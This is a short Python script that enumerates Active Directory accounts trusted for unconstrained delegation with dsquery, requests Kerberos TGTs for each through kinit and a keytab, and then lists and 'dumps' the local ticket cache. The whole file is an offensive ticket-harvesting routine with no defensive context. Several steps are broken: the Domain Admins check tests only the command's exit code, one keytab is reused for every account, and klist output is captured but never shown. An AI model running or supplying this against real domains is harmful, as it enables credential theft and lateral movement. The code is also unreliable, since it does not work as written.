import subprocess
if not subprocess.run(["net", "localgroup", "Domain Admins"], capture_output=True).returncode == 0:
    print("Error: current user is not a member of the Domain Admins group.")
    exit(1)

output = subprocess.run(["dsquery", "*", "-filter", "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))"], capture_output=True, text=True).stdout
service_accounts = [line.split(",")[0].split("=")[1] for line in output.splitlines()]
print("Found {} service accounts:".format(len(service_accounts)))
print(service_accounts)
for service_account in service_accounts:
    print("Requesting TGT for {}".format(service_account))
    subprocess.run(["kinit", "-k", "-t", "ServiceAccount.keytab", service_account], capture_output=True)
print("Listing TGTs in local cache:")
subprocess.run(["klist"], capture_output=True)
print("Dumping TGTs from local cache:")
subprocess.run(["klist", "-kte", "ServiceAccount.keytab"], capture_output=True)
